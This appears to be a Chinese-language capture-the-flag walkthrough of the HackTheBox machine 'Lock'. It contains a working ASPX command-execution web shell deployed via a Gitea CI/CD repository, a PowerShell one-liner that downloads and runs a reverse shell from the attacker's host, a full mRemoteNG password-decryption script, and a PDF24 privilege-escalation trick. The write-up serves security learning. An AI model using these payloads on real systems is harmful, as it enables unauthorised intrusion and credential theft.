# 信息收集

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 10.129.234.64
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
Nmap scan report for 10.129.234.64 (10.129.234.64)
Host is up (0.17s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds

┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sV -sC -O -p80,445,3000,3389 10.129.234.64
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 12:20 CST
Nmap scan report for 10.129.234.64 (10.129.234.64)
Host is up (0.18s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=a865c00922d0321f; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=1qqwoFwYj7mnLM1dUF-dAWixUxw6MTc2NDkwODQzODU5OTY1NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 05 Dec 2025 04:20:38 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=8d992280eb14793f; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=D4r1ealHN8sJRRAbJCv0_SM0E086MTc2NDkwODQzOTQ4MzA5NzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 05 Dec 2025 04:20:39 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-05T04:21:10+00:00
|_ssl-date: 2025-12-05T04:21:49+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-12-04T04:18:57
|_Not valid after:  2026-06-05T04:18:57
1 service unrecognized despite returning data.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-12-05T04:21:11
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.66 seconds
```

可以看到开放了Web(80,3000)，smb(445)，rpc(3389)，基本可以确定这是台windows机器

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# curl 10.129.234.64                                                       
  <!-- =======================================================
  * Template Name: Gp
  * Updated: Nov 25 2023 with Bootstrap v5.3.2
  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
</head>
```
curl一下目标靶机，可以看到bootstrap框架，见过的都了解这是个前端框架，没有什么利用价值

在3000端口下可以找到历史版的脚本`http://10.129.234.64:3000/ellen.freeman/dev-scripts/commit/dcc869b175a47ff2a2b8171cda55cb82dbddff3d`

```python
import requests
import sys

# store this in env instead at some point
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    try:
        repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```
可以看到**PERSONAL_ACCESS_TOKEN**被硬编码了，在新版脚本中，从环境变量读取凭据，然后列出仓库
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f                                                       
┌──(root㉿MJ)-[/tmp/test]
└─# vim ez.py

┌──(root㉿MJ)-[/tmp/test]
└─# python3 ez.py http://10.129.234.64:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
列出了仓库
```
一个是3000端口部署的，一个是80部署的
```bash
git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/dev-scripts.git

git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
```
如果未知用户名可以直接使用`http://<PAT>@ip:port/<REPO_FULL_NAME>.git`


```bash
┌──(root㉿MJ)-[/tmp/test/website]
└─# cat changelog.txt&& cat readme.md
# Changelog

- Added first website version
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

# Web

可以看到提示，存储库的改变会被自动推送到网站上，所以可以写个windows的木马推上去

```bash
┌──(root㉿MJ)-[/tmp/test/website]
└─# cat shell.aspx
<%@ Page Language="C#"%>
<%@ Import Namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO"%>
<script language="C#" runat="server">
    void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd)) {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            output += p.StandardError.ReadToEnd();
            p.WaitForExit();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>

┌──(root㉿MJ)-[/tmp/test/website]
└─# git add shell.aspx

┌──(root㉿MJ)-[/tmp/test/website]
└─# git commit -m "Added shell.aspx for temporary debugging"
[main 9733d61] Added shell.aspx for temporary debugging
 Committer: root <root@MJ.localdomain>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 21 insertions(+)
 create mode 100644 shell.aspx

┌──(root㉿MJ)-[/tmp/test/website]
└─# git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 20 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 663 bytes | 663.00 KiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.234.64:3000/ellen.freeman/website.git
   73cdcc1..9733d61  main -> main

┌──(root㉿MJ)-[/tmp/test/website]
└─# curl http://10.129.234.64/shell.aspx?cmd=whoami
<pre>lock\ellen.freeman
</pre>                                                                       
```

# 提权

交互式shell
```powershell
New-Item -Path C:\temp -Type Directory -Force; (New-Object System.Net.WebClient).DownloadFile('http://10.10.16.15:8000/ConPtyShell.exe','C:\temp\ConPtyShell.exe'); C:\temp\ConPtyShell.exe 10.10.16.15 2332
```

```bash
curl 'http://10.129.234.64/shell.aspx?cmd=powershell.exe%20-c%20%22New-Item%20-Path%20C%3A%5Ctemp%20-Type%20Directory%20-Force%3B%20(New-Object%20System.Net.WebClient).DownloadFile(%27http%3A%2F%2F10.10.16.15%3A8000%2FConPtyShell.exe%27%2C%27C%3A%5Ctemp%5CConPtyShell.exe%27)%3B%20C%3A%5Ctemp%5CConPtyShell.exe%2010.10.16.15%202332%22'
```

在document目录下发现config.xml
```bash
┌──(root㉿MJ)-[~/…/Linux/vshell/download/2]
└─# cat config.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

这是`mRemoteNG` 远程桌面管理工具**的配置文件**
## 🔑 敏感信息分析

| **字段**                                                                                                 | **含义**                                  | **价值**    |
| ------------------------------------------------------------------------------------------------------ | --------------------------------------- | --------- |
| `xmlns:mrng="http://mremoteng.org"`                                                                    | 确认这是 `mRemoteNG` 软件的配置文件。               | 软件识别      |
| `Username="Gale.Dekarios"`                                                                             | 存储了连接的用户名。                              | **新用户凭证** |
| `Hostname="Lock"`                                                                                      | 目标主机名（很可能就是您当前机器的名称，或另一个需要 RDP 连接的主机）。  | 目标定位      |
| `Protocol="RDP"`                                                                                       | 连接类型是 **远程桌面协议 (RDP)**。                 | 攻击方向      |
| `Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=="`  | **加密的密码**。这是提权的关键目标。                    | **最高价值**  |
| `EncryptionEngine="AES"`                                                                               | 使用 **AES** (高级加密标准) 加密。                 | 破解线索      |
| `BlockCipherMode="GCM"`                                                                                | 使用 **GCM** (Galois/Counter Mode) 块密码模式。 | 破解线索      |
| `Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp"` | 这是一个**主密钥**，用于保护文件中的所有敏感数据。             | 破解线索      |


用py脚本进行解密

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# python3 mRemoteNG.py -rf config.xml
Username: Gale.Dekarios
Hostname: Lock
Password: ty8wnW9qCKDosXo6
```

### 脚本

```python
#!/usr/bin/env python3

import hashlib
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import argparse
import sys
import xml.etree.ElementTree as ET


def decrypt_legacy(encrypted_data, password):
    try:
        encrypted_data = encrypted_data.strip()
        encrypted_data = base64.b64decode(encrypted_data)
        initial_vector = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        key = hashlib.md5(password.encode()).digest()

        cipher = AES.new(key, AES.MODE_CBC, initial_vector)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext
    except Exception as e:
        print("Failed to decrypt the password with the following error: {}".format(e))
        return b''

def decrypt(encrypted_data, password):
    try:
        encrypted_data = encrypted_data.strip()
        encrypted_data = base64.b64decode(encrypted_data)
        salt = encrypted_data[:16]
        associated_data = encrypted_data[:16]
        nonce = encrypted_data[16:32]
        ciphertext = encrypted_data[32:-16]
        tag = encrypted_data[-16:]
        key = hashlib.pbkdf2_hmac(
            "sha1", password.encode(), salt, 1000, dklen=32)

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        cipher.update(associated_data)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except Exception as e:
        print("Failed to decrypt the password with the following error: {}".format(e))
        return b''


def main():
    parser = argparse.ArgumentParser(
        description="Decrypt mRemoteNG passwords.")
    if len(sys.argv) < 2:
        parser.print_help(sys.stderr)
        sys.exit(1)

    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        "-f", "--file", help="Name of file containing mRemoteNG password")
    # Thanks idea from @KingKorSin
    group.add_argument(
        "-rf", "--realFile", help="Name of the Real mRemoteNG connections file containing the passwords")
    group.add_argument(
        "-s", "--string", help="base64 string of mRemoteNG password")
    parser.add_argument("-p", "--password",
                        help="Custom password", default="mR3m")
    parser.add_argument("-L", "--legacy", help="version <= 1.74", type=bool, default=False)
    args = parser.parse_args()

    decrypt_func = decrypt
    if args.legacy:
        decrypt_func = decrypt_legacy

    if args.realFile != None:
        tree = ET.parse(args.realFile)
        root = tree.getroot()
        for node in root.iter('Node'):
            if node.attrib['Password']:
                decPass = decrypt_func(node.attrib['Password'], args.password)
                if node.attrib['Username']:
                    print("Username: {}".format(node.attrib['Username']))
                if node.attrib['Hostname']:
                    print("Hostname: {}".format(node.attrib['Hostname']))
                print("Password: {} \n".format(decPass.decode("utf-8")))
        sys.exit(1)

    elif args.file != None:
        with open(args.file) as f:
            encrypted_data = f.read()
            decPass = decrypt(encrypted_data, args.password)

    elif args.string != None:
        encrypted_data = args.string
        decPass = decrypt(encrypted_data, args.password)

    else:
        print("Please use either the file (-f, --file) or string (-s, --string) flag")
        sys.exit(1)

    try:
        print("Password: {}".format(decPass.decode("utf-8")))
    except Exception as e:
        print("Failed to find the password property with the following error: {}".format(e))


if __name__ == "__main__":
    main()
```

这是github开源项目，懒人可以直接复制了


xfreerdp3连上即可
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# xfreerdp3 /v:10.129.234.64 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6
```

在桌面下可以发现pdf24，pdf24 11.15.1存在提权漏洞可以提升为system

首先去下载SetOpLock.exe
[googleprojectzero/symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)



**运行pdf24安装程序，点击修复，等待弹出cmd黑框，顶部导航栏打开属性，底部有legacy console mode选项，点击使用非ie和edge浏览器打开，ctrl+o打开选项卡，顶部输入cmd即可提权**

# 不详细演示，不喜欢贴图片

[HTB：锁定 |0xdf破解东西](https://0xdf.gitlab.io/2025/08/21/htb-lock.html#shell-as-system)

